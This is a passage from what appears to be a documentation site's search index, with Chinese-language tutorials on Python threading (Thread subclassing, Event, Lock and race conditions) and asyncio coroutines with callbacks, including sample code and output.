page:9","title":"\u901a\u8fc7\u7ee7\u627f\u5b9e\u73b0\u591a\u7ebf\u7a0b"},{"location":"programming_language/python/threading/thread/#_1","text":"","title":"\u901a\u8fc7\u7ee7\u627f\u5b9e\u73b0\u591a\u7ebf\u7a0b"},{"location":"programming_language/python/threading/thread/#run","text":"\u5148\u770b\u4e0d\u5e26init\u65b9\u6cd5\u7684 import time import threading class MyThread(threading.Thread): def run(self): time.sleep(1) a = 1 + 1 print(a) for _ in range(5): th = MyThread() th.start() \u7ed3\u679c\uff1a 2 2 2 2 2 \u5b9a\u4e49\u4e00\u4e2a\u7c7b\uff0c\u7ee7\u627f threading.Thread \u7c7b\uff0c\u91cc\u9762\u53ea\u9700\u8981\u5b9a\u4e49 run \u65b9\u6cd5 run \u65b9\u6cd5\u76f8\u5f53\u4e8e\u4e4b\u524d\u4f20\u5165 Thread \u7684\u90a3\u4e2a\u51fd\u6570\uff0c\u6ce8\u610f\u53ea\u80fd\u7528 run \u8fd9\u4e2a\u540d\u5b57\uff0c\u4e0d\u7528\u663e\u5f0f\u8c03\u7528\uff0c\u7ebf\u7a0b start() \u65f6\u4f1a\u81ea\u52a8\u8c03\u7528 run \u521b\u5efa\u7c7b\u7684\u5b9e\u4f8b\u65f6\u4e0d\u9700\u8981\u4f20\u5165\u53c2\u6570\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u5c31\u53ef\u4ee5\u8c03\u7528 start join \u7b49\u65b9\u6cd5 Thread \u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528 start join run \u7b49\u65b9\u6cd5\uff0c\u5176\u5b9e\u5f53\u65f6\u8c03\u7528 start \u5c31\u662f\u81ea\u52a8\u8c03\u7528\u4e86 run \u3002\u8fd9\u91cc\u53ea\u4e0d\u8fc7\u662f\u5728\u65b0\u7c7b\u4e2d\u91cd\u5199\u4e86 run \u65b9\u6cd5\uff0c\u7ebf\u7a0b\u8c03\u7528 start \u65f6\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u8fd9\u4e2a run","title":"\u4e00\uff0c\u5b9e\u73b0run\u65b9\u6cd5"},{"location":"programming_language/python/threading/thread/#_2","text":"\u5e26\u521d\u59cb\u5316\u65b9\u6cd5\u7684\uff0c\u4e0a\u9762\u6bcf\u6b21\u8fd0\u884c\u7684 run \u90fd\u662f\u4e00\u6837\u7684\uff0c\u771f\u6b63\u4f7f\u7528\u65f6\u5f88\u5c11\u4f1a\u8fd9\u6837\u7528\uff0c\u6709\u65f6\u4f1a\u9700\u8981\u4f20\u5165\u4e00\u4e9b\u533a\u522b\u6027\u7684\u53c2\u6570\uff0c\u8fd9\u5c31\u9700\u8981\u5b9a\u4e49\u7c7b\u7684 __init__ \u4e86 import threading import requests from bs4 import BeautifulSoup class MyThread(threading.Thread): def __init__(self, i): threading.Thread.__init__(self) self.i = i def run(self): print(self.i) for i in range(10): th = MyThread(i) th.start() \u7ed3\u679c\uff1a 0 1 2 3 4 5 6 7 8 9","title":"\u4e8c\uff0c\u7528\u521d\u59cb\u5316\u65b9\u6cd5\u5b9e\u73b0\u4f20\u53c2"},{"location":"programming_language/python/threading/thread/#thrad","text":"Thread \u51fd\u6570\u7684\u53c2\u6570\u3002\u521d\u59cb\u5316\u7ebf\u7a0b\u65f6\u4f20\u5165\u4e00\u4e9b\u53c2\u6570\uff0c\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u5728 __init__ \u4e2d\u5b9a\u4e49 Thread \u5bf9\u8c61\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u53ef\u4ee5\u7528 self \u76f4\u63a5\u8c03\u7528\u8fd9\u4e9b\u65b9\u6cd5 threading.activeCount() \u7b49\u76f4\u63a5\u8c03\u7528\u7684\u53d8\u91cf\u3002\u5728\u8fd9\u91cc\u4f9d\u7136\u53ef\u4ee5\u8c03\u7528 \u6240\u4ee5\u7528\u7c7b\u7684\u65b9\u6cd5\u4e0d\u4f1a\u6709\u4efb\u4f55\u9650\u5236\uff0c\u4e0b\u9762\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50 import time import threading class MyThread(threading.Thread): def __init__(self, name): threading.Thread.__init__(self) self.name = name # \u8fd9\u6837\u5c31\u76f8\u5f53\u4e8eThread\u4e2d\u7684name\u53c2\u6570\u4e86 def run(self): a = 1 + 1 print(threading.currentThread().name) time.sleep(1) print(self.name) time.sleep(1) print(self.is_alive()) # \u672a\u663e\u5f0f\u5b9a\u4e49\u8fc7\u5c31\u53ef\u4ee5\u76f4\u63a5\u7528 t = time.time() ths = [MyThread('thread {}'.format(i)) for i in range(3)] print(\"len(ths):\"+str(len(ths))) for th in ths: th.start() print(\"threading.activeCount:\"+str(threading.activeCount())) for th in ths: th.join() print(time.time() - t)","title":"\u4e09\uff0c\u8c03\u7528Thrad\u5bf9\u8c61\u7684\u65b9\u6cd5"},{"location":"programming_language/python/threading/thread/#run_1","text":"\u4e4b\u524d\u662f\u76f4\u63a5\u7528 run \u5b9a\u4e49\u8ba1\u7b97\u51fd\u6570\uff0c\u5982\u679c\u5df2\u7ecf\u6709\u4e00\u4e2a\u8ba1\u7b97\u51fd\u6570\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f20\u5165\u7684\u65b9\u5f0f\u800c\u4e0d\u662f\u6539\u5199\u6210 run import threading def gettitle(page): print(\"page:\"+str(page)) class MyThread(threading.Thread): def __init__(self, target, **args): threading.Thread.__init__(self) self.target = target self.args = args def run(self): self.target(**self.args) for i in range(10): th = MyThread(gettitle, page = i) th.start() \u7ed3\u679c\uff1a page:0 page:1 page:2 page:3 page:4 page:5 page:6 page:7 page:8 page:9","title":"\u56db\uff0c\u7ed9run\u65b9\u6cd5\u4f20\u5165\u5199\u597d\u7684\u65b9\u6cd5"},{"location":"programming_language/python/threading/thread_event/","text":"threading.Event() \u901a\u8fc7threading.Event()\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u4e8b\u4ef6\u7ba1\u7406\u6807\u5fd7\uff0c\u8be5\u6807\u5fd7\uff08event\uff09\u9ed8\u8ba4\u4e3aFalse\uff0cevent\u5bf9\u8c61\u4e3b\u8981\u6709\u56db\u79cd\u65b9\u6cd5\u53ef\u4ee5\u8c03\u7528\uff1a event.wait(timeout=None)\uff1a\u8c03\u7528\u8be5\u65b9\u6cd5\u7684\u7ebf\u7a0b\u4f1a\u88ab\u963b\u585e\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86timeout\u53c2\u6570\uff0c\u8d85\u65f6\u540e\uff0c\u7ebf\u7a0b\u4f1a\u505c\u6b62\u963b\u585e\u7ee7\u7eed\u6267\u884c\uff1b event.set()\uff1a\u5c06event\u7684\u6807\u5fd7\u8bbe\u7f6e\u4e3aTrue\uff0c\u8c03\u7528wait\u65b9\u6cd5\u7684\u6240\u6709\u7ebf\u7a0b\u5c06\u88ab\u5524\u9192\uff1b event.clear()\uff1a\u5c06event\u7684\u6807\u5fd7\u8bbe\u7f6e\u4e3aFalse\uff0c\u8c03\u7528wait\u65b9\u6cd5\u7684\u6240\u6709\u7ebf\u7a0b\u5c06\u88ab\u963b\u585e\uff1b event.isSet()\uff1a\u5224\u65adevent\u7684\u6807\u5fd7\u662f\u5426\u4e3aTrue\u3002 import threading import time event = threading.Event() def func(): # \u7b49\u5f85\u4e8b\u4ef6\uff0c\u8fdb\u5165\u7b49\u5f85\u963b\u585e\u72b6\u6001 print('%s wait for event...' % threading.currentThread().getName()) print(\"event.is_set():\"+str(event.is_set())) event.wait() # \u6536\u5230\u4e8b\u4ef6\u540e\u8fdb\u5165\u8fd0\u884c\u72b6\u6001 print('%s recv event.' % threading.currentThread().getName()) print(\"event.is_set():\"+str(event.is_set())) t1 = threading.Thread(target=func) t2 = threading.Thread(target=func) t1.start() t2.start() time.sleep(2) # \u53d1\u9001\u4e8b\u4ef6\u901a\u77e5 print('MainThread set event..............') event.set() \u7ed3\u679c\uff1a Thread-1 wait for event... event.is_set():False Thread-2 wait for event... event.is_set():False MainThread set event.............. Thread-2 recv event. event.is_set():True Thread-1 recv event. event.is_set():True \u8fdb\u7a0b\u5df2\u7ed3\u675f\uff0c\u9000\u51fa\u4ee3\u7801\u4e3a 0 \u7528\u7ee7\u627f\u65b9\u5f0f\u5b9e\u73b0 import threading import time class MyThread(threading.Thread): event = threading.Event() def run(self): # \u7b49\u5f85\u4e8b\u4ef6\uff0c\u8fdb\u5165\u7b49\u5f85\u963b\u585e\u72b6\u6001 print('%s wait for event...' % threading.currentThread().getName()) print(\"event.is_set():\" + str(MyThread.event.is_set())) MyThread.event.wait() # \u6536\u5230\u4e8b\u4ef6\u540e\u8fdb\u5165\u8fd0\u884c\u72b6\u6001 print('%s recv event.' % threading.currentThread().getName()) print(\"event.is_set():\" + str(MyThread.event.is_set())) t1 = MyThread() t2 = MyThread() t1.start() t2.start() time.sleep(2) # \u53d1\u9001\u4e8b\u4ef6\u901a\u77e5 print('MainThread set event..............') MyThread.event.set() \u7ed3\u679c\uff1a Thread-1 wait for event... event.is_set():False Thread-2 wait for event... event.is_set():False MainThread set event.............. Thread-2 recv event. event.is_set():True Thread-1 recv event. event.is_set():True \u8fdb\u7a0b\u5df2\u7ed3\u675f\uff0c\u9000\u51fa\u4ee3\u7801\u4e3a 0","title":"threading.Event()"},{"location":"programming_language/python/threading/thread_event/#threadingevent","text":"\u901a\u8fc7threading.Event()\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u4e8b\u4ef6\u7ba1\u7406\u6807\u5fd7\uff0c\u8be5\u6807\u5fd7\uff08event\uff09\u9ed8\u8ba4\u4e3aFalse\uff0cevent\u5bf9\u8c61\u4e3b\u8981\u6709\u56db\u79cd\u65b9\u6cd5\u53ef\u4ee5\u8c03\u7528\uff1a event.wait(timeout=None)\uff1a\u8c03\u7528\u8be5\u65b9\u6cd5\u7684\u7ebf\u7a0b\u4f1a\u88ab\u963b\u585e\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86timeout\u53c2\u6570\uff0c\u8d85\u65f6\u540e\uff0c\u7ebf\u7a0b\u4f1a\u505c\u6b62\u963b\u585e\u7ee7\u7eed\u6267\u884c\uff1b event.set()\uff1a\u5c06event\u7684\u6807\u5fd7\u8bbe\u7f6e\u4e3aTrue\uff0c\u8c03\u7528wait\u65b9\u6cd5\u7684\u6240\u6709\u7ebf\u7a0b\u5c06\u88ab\u5524\u9192\uff1b event.clear()\uff1a\u5c06event\u7684\u6807\u5fd7\u8bbe\u7f6e\u4e3aFalse\uff0c\u8c03\u7528wait\u65b9\u6cd5\u7684\u6240\u6709\u7ebf\u7a0b\u5c06\u88ab\u963b\u585e\uff1b event.isSet()\uff1a\u5224\u65adevent\u7684\u6807\u5fd7\u662f\u5426\u4e3aTrue\u3002 import threading import time event = threading.Event() def func(): # \u7b49\u5f85\u4e8b\u4ef6\uff0c\u8fdb\u5165\u7b49\u5f85\u963b\u585e\u72b6\u6001 print('%s wait for event...' % threading.currentThread().getName()) print(\"event.is_set():\"+str(event.is_set())) event.wait() # \u6536\u5230\u4e8b\u4ef6\u540e\u8fdb\u5165\u8fd0\u884c\u72b6\u6001 print('%s recv event.' % threading.currentThread().getName()) print(\"event.is_set():\"+str(event.is_set())) t1 = threading.Thread(target=func) t2 = threading.Thread(target=func) t1.start() t2.start() time.sleep(2) # \u53d1\u9001\u4e8b\u4ef6\u901a\u77e5 print('MainThread set event..............') event.set() \u7ed3\u679c\uff1a Thread-1 wait for event... event.is_set():False Thread-2 wait for event... event.is_set():False MainThread set event.............. Thread-2 recv event. event.is_set():True Thread-1 recv event. event.is_set():True \u8fdb\u7a0b\u5df2\u7ed3\u675f\uff0c\u9000\u51fa\u4ee3\u7801\u4e3a 0","title":"threading.Event()"},{"location":"programming_language/python/threading/thread_event/#_1","text":"import threading import time class MyThread(threading.Thread): event = threading.Event() def run(self): # \u7b49\u5f85\u4e8b\u4ef6\uff0c\u8fdb\u5165\u7b49\u5f85\u963b\u585e\u72b6\u6001 print('%s wait for event...' % threading.currentThread().getName()) print(\"event.is_set():\" + str(MyThread.event.is_set())) MyThread.event.wait() # \u6536\u5230\u4e8b\u4ef6\u540e\u8fdb\u5165\u8fd0\u884c\u72b6\u6001 print('%s recv event.' % threading.currentThread().getName()) print(\"event.is_set():\" + str(MyThread.event.is_set())) t1 = MyThread() t2 = MyThread() t1.start() t2.start() time.sleep(2) # \u53d1\u9001\u4e8b\u4ef6\u901a\u77e5 print('MainThread set event..............') MyThread.event.set() \u7ed3\u679c\uff1a Thread-1 wait for event... event.is_set():False Thread-2 wait for event... event.is_set():False MainThread set event.............. Thread-2 recv event. event.is_set():True Thread-1 recv event. event.is_set():True \u8fdb\u7a0b\u5df2\u7ed3\u675f\uff0c\u9000\u51fa\u4ee3\u7801\u4e3a 0","title":"\u7528\u7ee7\u627f\u65b9\u5f0f\u5b9e\u73b0"},{"location":"programming_language/python/threading/thread%E7%BA%BF%E7%A8%8B%E9%94%81/","text":"Python\u7ebf\u7a0b\u9501 \u6b63\u5e38\u4e0a\u9501\u7684\u60c5\u51b5 \u4e09\u4e2a\u7ebf\u7a0b\u5bf9num\u8fdb\u884c\u589e\u51cf\uff0c\u5bf9num\u64cd\u4f5c\u90e8\u5206\u8fdb\u884c\u4e0a\u9501\uff0c\u8fdb\u5165\u9501\u4e4b\u540e\uff0c\u7ebf\u7a0b\u4e32\u884c\u8fd0\u884c # -*- coding: utf-8 -*- import time, threading, ctypes num = 0 lock = threading.Lock() def task_thread(n): global num print(\"-----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4\" + time.asctime(time.localtime(time.time()))) lock.acquire() print(\"\u8fdb\u5165\u7ebf\u7a0b\u9501\u65f6\u95f4\" + time.asctime(time.localtime(time.time()))) for i in range(10000000): num = num + n num = num - n lock.release() t1 = threading.Thread(target=task_thread, args=(6,)) t2 = threading.Thread(target=task_thread, args=(17,)) t3 = threading.Thread(target=task_thread, args=(11,)) t1.start() t2.start() t3.start() t1.join() t2.join() t3.join() print(num) \u8fd0\u884c\u7ed3\u679c\uff1a -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:29:29 2022 \u8fdb\u5165\u7ebf\u7a0b\u9501\u65f6\u95f4Tue Aug 23 19:29:29 2022 -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:29:29 2022 -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:29:29 2022 \u8fdb\u5165\u7ebf\u7a0b\u9501\u65f6\u95f4Tue Aug 23 19:29:31 2022 \u8fdb\u5165\u7ebf\u7a0b\u9501\u65f6\u95f4Tue Aug 23 19:29:32 2022 0 \u4e0d\u4e0a\u9501\u7684\u60c5\u51b5 \u53bb\u6389\u7ebf\u7a0b\u9501\u540e\uff0c\u7ebf\u7a0b\u90fd\u5f00\u59cb\u540c\u65f6\u8fdb\u884c\u64cd\u4f5c\uff0c\u7b97\u51fa\u6765\u7684\u6570\u5b57\u4e5f\u662f\u9519\u8bef\u7684 # -*- coding: utf-8 -*- import time, threading, ctypes num = 0 def task_thread(n): global num print(\"-----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4\" + time.asctime(time.localtime(time.time()))) print(\"\u8fdb\u5165\u7ebf\u7a0b\u65f6\u95f4\" + time.asctime(time.localtime(time.time()))) for i in range(10000000): num = num + n num = num - n t1 = threading.Thread(target=task_thread, args=(6,)) t2 = threading.Thread(target=task_thread, args=(17,)) t3 = threading.Thread(target=task_thread, args=(11,)) t1.start() t2.start() t3.start() t1.join() t2.join() t3.join() print(num) \u8fd0\u884c\u7ed3\u679c\uff1a -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 \u8fdb\u5165\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 \u8fdb\u5165\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 \u8fdb\u5165\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 10","title":"thread\u7ebf\u7a0b\u9501"},{"location":"programming_language/python/threading/thread%E7%BA%BF%E7%A8%8B%E9%94%81/#python","text":"","title":"Python\u7ebf\u7a0b\u9501"},{"location":"programming_language/python/threading/thread%E7%BA%BF%E7%A8%8B%E9%94%81/#_1","text":"\u4e09\u4e2a\u7ebf\u7a0b\u5bf9num\u8fdb\u884c\u589e\u51cf\uff0c\u5bf9num\u64cd\u4f5c\u90e8\u5206\u8fdb\u884c\u4e0a\u9501\uff0c\u8fdb\u5165\u9501\u4e4b\u540e\uff0c\u7ebf\u7a0b\u4e32\u884c\u8fd0\u884c # -*- coding: utf-8 -*- import time, threading, ctypes num = 0 lock = threading.Lock() def task_thread(n): global num print(\"-----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4\" + time.asctime(time.localtime(time.time()))) lock.acquire() print(\"\u8fdb\u5165\u7ebf\u7a0b\u9501\u65f6\u95f4\" + time.asctime(time.localtime(time.time()))) for i in range(10000000): num = num + n num = num - n lock.release() t1 = threading.Thread(target=task_thread, args=(6,)) t2 = threading.Thread(target=task_thread, args=(17,)) t3 = threading.Thread(target=task_thread, args=(11,)) t1.start() t2.start() t3.start() t1.join() t2.join() t3.join() print(num) \u8fd0\u884c\u7ed3\u679c\uff1a -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:29:29 2022 \u8fdb\u5165\u7ebf\u7a0b\u9501\u65f6\u95f4Tue Aug 23 19:29:29 2022 -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:29:29 2022 -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:29:29 2022 \u8fdb\u5165\u7ebf\u7a0b\u9501\u65f6\u95f4Tue Aug 23 19:29:31 2022 \u8fdb\u5165\u7ebf\u7a0b\u9501\u65f6\u95f4Tue Aug 23 19:29:32 2022 0","title":"\u6b63\u5e38\u4e0a\u9501\u7684\u60c5\u51b5"},{"location":"programming_language/python/threading/thread%E7%BA%BF%E7%A8%8B%E9%94%81/#_2","text":"\u53bb\u6389\u7ebf\u7a0b\u9501\u540e\uff0c\u7ebf\u7a0b\u90fd\u5f00\u59cb\u540c\u65f6\u8fdb\u884c\u64cd\u4f5c\uff0c\u7b97\u51fa\u6765\u7684\u6570\u5b57\u4e5f\u662f\u9519\u8bef\u7684 # -*- coding: utf-8 -*- import time, threading, ctypes num = 0 def task_thread(n): global num print(\"-----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4\" + time.asctime(time.localtime(time.time()))) print(\"\u8fdb\u5165\u7ebf\u7a0b\u65f6\u95f4\" + time.asctime(time.localtime(time.time()))) for i in range(10000000): num = num + n num = num - n t1 = threading.Thread(target=task_thread, args=(6,)) t2 = threading.Thread(target=task_thread, args=(17,)) t3 = threading.Thread(target=task_thread, args=(11,)) t1.start() t2.start() t3.start() t1.join() t2.join() t3.join() print(num) \u8fd0\u884c\u7ed3\u679c\uff1a -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 \u8fdb\u5165\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 \u8fdb\u5165\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 -----\u5f00\u59cb\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 \u8fdb\u5165\u7ebf\u7a0b\u65f6\u95f4Tue Aug 23 19:37:09 2022 10","title":"\u4e0d\u4e0a\u9501\u7684\u60c5\u51b5"},{"location":"programming_language/python/%E5%8D%8F%E7%A8%8B/%E5%8D%8F%E7%A8%8B/","text":"\u534f\u7a0b \u4ec0\u4e48\u662f\u534f\u7a0b \u534f\u7a0b\u662f\u8f7b\u91cf\u7ea7\u7ebf\u7a0b\uff0c\u62e5\u6709\u81ea\u5df1\u7684\u5bc4\u5b58\u5668\u4e0a\u4e0b\u6587\u548c\u6808\u3002\u534f\u7a0b\u8c03\u5ea6\u5207\u6362\u65f6\uff0c\u5c06\u5bc4\u5b58\u5668\u4e0a\u4e0b\u6587\u548c\u6808\u4fdd\u5b58\u5230\u5176\u4ed6\u5730\u65b9\uff0c\u5728\u5207\u56de\u6765\u65f6\uff0c\u6062\u590d\u5148\u524d\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u4e0a\u4e0b\u6587\u548c\u6808\u3002\u56e0\u6b64\uff0c\u534f\u7a0b\u80fd\u4fdd\u7559\u4e0a\u4e00\u6b21\u8c03\u7528\u65f6\u7684\u72b6\u6001\uff0c\u5373\u6240\u6709\u5c40\u90e8\u72b6\u6001\u7684\u4e00\u4e2a\u7279\u5b9a\u7ec4\u5408\uff0c\u6bcf\u6b21\u8fc7\u7a0b\u91cd\u5165\u65f6\uff0c\u5c31\u76f8\u5f53\u4e8e\u8fdb\u5165\u4e0a\u4e00\u6b21\u8c03\u7528\u7684\u72b6\u6001\u3002 \u4ec0\u4e48\u65f6\u5019\u7528 \u534f\u7a0b\u7684\u5e94\u7528\u573a\u666f\uff1aI/O\u5bc6\u96c6\u578b\u4efb\u52a1\u3002\u8fd9\u4e00\u70b9\u4e0e\u591a\u7ebf\u7a0b\u6709\u4e9b\u7c7b\u4f3c\uff0c\u4f46\u534f\u7a0b\u8c03\u7528\u662f\u5728\u4e00\u4e2a\u7ebf\u7a0b\u5185\u8fdb\u884c\u7684\uff0c\u662f\u5355\u7ebf\u7a0b\uff0c\u5207\u6362\u7684\u5f00\u9500\u5c0f\uff0c\u56e0\u6b64\u6548\u7387\u4e0a\u7565\u9ad8\u4e8e\u591a\u7ebf\u7a0b\u3002\u5f53\u7a0b\u5e8f\u5728\u6267\u884cIO\u64cd\u4f5c\u65f6\uff0cCPU\u662f\u7a7a\u95f2\u7684\uff0c\u53ef\u4ee5\u5145\u5206\u5229\u7528CPU\u7684\u65f6\u95f4\u7247\u6765\u5904\u7406\u5176\u4ed6\u4efb\u52a1\u3002\u5728\u5355\u7ebf\u7a0b\u4e2d\uff0c\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\uff0c\u4e00\u822c\u662f\u4ece\u51fd\u6570\u7684\u7b2c\u4e00\u884c\u4ee3\u7801\u5f00\u59cb\u6267\u884c\uff0c\u7ed3\u675f\u4e8ereturn\u8bed\u53e5\u3001\u5f02\u5e38\u6216\u51fd\u6570\u6267\u884c\uff08\u4e5f\u53ef\u4ee5\u8ba4\u4e3a\u662f\u9690\u5f0f\u5730\u8fd4\u56de\u4e86None\uff09\u3002\u6709\u4e86\u534f\u7a0b\uff0c\u6211\u4eec\u5728\u51fd\u6570\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u9047\u5230\u4e86\u8017\u65f6\u7684I/O\u64cd\u4f5c\uff0c\u51fd\u6570\u5c31\u53ef\u4ee5\u4e34\u65f6\u8ba9\u51fa\u63a7\u5236\u6743\uff0c\u8ba9CPU\u6267\u884c\u5176\u4ed6\u51fd\u6570\uff0c\u7b49I/O\u64cd\u4f5c\u6267\u884c\u5b8c\u6bd5\u540e\u518d\u6536\u56de\u63a7\u5236\u6743\u3002 \u5b9a\u4e49\u534f\u7a0b \u9996\u5148\u5f15\u5165asyncio\uff0c\u8fd9\u6837\u624d\u53ef\u4ee5\u4f7f\u7528async\u548cawait\u5173\u952e\u5b57\uff08async\u5b9a\u4e49\u4e00\u4e2a\u534f\u7a0b\uff0cawait\u7528\u4e8e\u4e34\u65f6\u6302\u8d77\u4e00\u4e2a\u51fd\u6570\u6216\u65b9\u6cd5\u7684\u6267\u884c\uff09\uff0c\u63a5\u7740\u4f7f\u7528async\u5b9a\u4e49\u4e00\u534f\u7a0b\u65b9\u6cd5\uff0c\u7136\u540e\u76f4\u63a5\u8c03\u7528\u8be5\u65b9\u6cd5\uff0c\u4f46\u662f\u8be5\u65b9\u6cd5\u5e76\u6ca1\u6709\u6267\u884c\uff0c\u800c\u662f\u8fd4\u56de\u4e86\u4e00\u4e2acoroutine\u534f\u7a0b\u5bf9\u8c61\u3002\u4f7f\u7528get_event_loop()\u65b9\u6cd5\u521b\u5efa\u4e00\u4e2a\u4e8b\u4ef6\u5faa\u73afloop\uff0c\u5e76\u8c03\u7528loop\u5bf9\u8c61\u7684run_until_complete()\u65b9\u6cd5\u5c06\u534f\u7a0b\u6ce8\u518c\u5230\u4e8b\u4ef6\u5faa\u73afloop\u4e2d\uff0c\u7136\u540e\u542f\u52a8\uff0c\u6700\u540e\u624d\u770b\u5230task\u65b9\u6cd5\u6253\u5370\u4e86\u8f93\u51fa\u7ed3\u679c\u3002async\u5b9a\u4e49\u7684\u65b9\u6cd5\u65e0\u6cd5\u76f4\u63a5\u6267\u884c\uff0c\u5fc5\u987b\u5c06\u5176\u6ce8\u518c\u5230\u4e8b\u4ef6\u5faa\u73af\u4e2d\u624d\u53ef\u4ee5\u6267\u884c\u3002 import asyncio import time async def task(): print(f\"{time.strftime('%H:%M:%S')}task\u5f00\u59cb\") time.sleep(2) print(f\"{time.strftime('%H:%M:%S')}task\u7ed3\u675f\") coroutine = task() print(f\"{time.strftime('%H:%M:%S')} \u4ea7\u751f\u534f\u7a0b\u5bf9\u8c61 {coroutine},\u51fd\u6570\u672a\u88ab\u8c03\u7528\") loop = asyncio.get_event_loop() print(f\"{time.strftime('%H:%M:%S')} \u5f00\u59cb\u8c03\u7528\u534f\u7a0b\") start = time.time() loop.run_until_complete(coroutine) end = time.time() print(f\"{time.strftime('%H:%M:%S')} \u7ed3\u675f\u8c03\u7528\u534f\u7a0b\uff0c\u8017\u65f6{end - start} \u79d2\") \u8fd0\u884c\u7ed3\u679c\uff1a 21:14:47 \u4ea7\u751f\u534f\u7a0b\u5bf9\u8c61 <coroutine object task at 0x7f98000ddbc0>,\u51fd\u6570\u672a\u88ab\u8c03\u7528 21:14:47 \u5f00\u59cb\u8c03\u7528\u534f\u7a0b 21:14:47task\u5f00\u59cb 21:14:49task\u7ed3\u675f 21:14:49 \u7ed3\u675f\u8c03\u7528\u534f\u7a0b\uff0c\u8017\u65f62.0022308826446533 \u79d2 \u6211\u4eec\u8fd8\u53ef\u4ee5\u4e3a\u4efb\u52a1\u7ed1\u5b9a\u56de\u8c03\u51fd\u6570\u3002 \u5728\u8fd9\u91cc\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u534f\u7a0b\u65b9\u6cd5\u548c\u4e00\u4e2a\u666e\u901a\u65b9\u6cd5\u4f5c\u4e3a\u56de\u8c03\u51fd\u6570\uff0c\u534f\u7a0b\u65b9\u6cd5\u6267\u884c\u540e\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32'\u8fd0\u884c\u675f'\u3002\u5176\u4e2d\u56de\u8c03\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u662ftask\u5bf9\u8c61\uff0c\u7136\u540e\u8c03\u7528print()\u65b9\u6cd5\u6253\u5370\u4e86task\u5bf9\u8c61\u7684\u7ed3\u679c\u3002asyncio.ensure_future(coroutine)\u53ef\u4ee5\u8fd4\u56detask\u5bf9\u8c61\uff0cadd_done_callback()\u4e3atask\u5bf9\u8c61\u589e\u52a0\u4e00\u4e2a\u56de\u8c03\u4efb\u52a1\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u5b9a\u4e49\u597d\u4e86\u4e00\u4e2acoroutine\u5bf9\u8c61\u548c\u4e00\u4e2a\u56de\u8c03\u65b9\u6cd5\uff0c\u6267\u884c\u7684\u7ed3\u679c\u662f\u5f53coroutine\u5bf9\u8c61\u6267\u884c\u5b8c\u6bd5\u4e4b\u540e\uff0c\u5c31\u53bb\u6267\u884c\u58f0\u660e\u7684callback()\u65b9\u6cd5\u3002 import asyncio import time async def _task(): print(f\"{time.strftime('%H:%M:%S')} task\u5f00\u59cb\") time.sleep(2) print(f\"{time.strftime('%H:%M:%S')} task\u7ed3\u675f\") return \"\u8fd0\u884c\u7ed3\u675f\" def callback(task): print(f\"{time.strftime('%H:%M:%S')} \u5f00\u59cb\u8c03\u7528\u534f\u7a0b\") print(f\"\u72b6\u6001\uff1a{task.result()}\") coroutine = _task() print(f\"{time.strftime('%H:%M:%S')} \u4ea7\u751f\u534f\u7a0b\u5bf9\u8c61 {coroutine},\u51fd\u6570\u672a\u88ab\u8c03\u7528\") task = asyncio.ensure_future(coroutine) task.add_done_callback(callback) loop = asyncio.get_event_loop() print(f\"{time.strftime('%H:%M:%S')} \u5f00\u59cb\u8c03\u7528\u534f\u7a0b\") start = time.time() loop.run_until_complete(task) end = time.time() print(f\"{time.strftime('%H:%M:%S')} \u7ed3\u675f\u8c03\u7528\u534f\u7a0b\uff0c\u8017\u65f6{end - start} \u79d2\") \u8fd0\u884c\u7ed3\u679c\uff1a 21:26:21 \u4ea7\u751f\u534f\u7a0b\u5bf9\u8c61 <coroutine object _task at 0x7fdb8479eac0>,\u51fd\u6570\u672a\u88ab\u8c03\u7528 21:26:21 \u5f00\u59cb\u8c03\u7528\u534f\u7a0b 21:26:21 task\u5f00\u59cb 21:26:23 task\u7ed3\u675f 21:26:23 \u5f00\u59cb\u8c03\u7528\u534f\u7a0b \u72b6\u6001\uff1a\u8fd0\u884c\u7ed3\u675f 21:26:23 \u7ed3\u675f\u8c03\u7528\u534f\u7a0b\uff0c\u8017\u65f62.0030200481414795 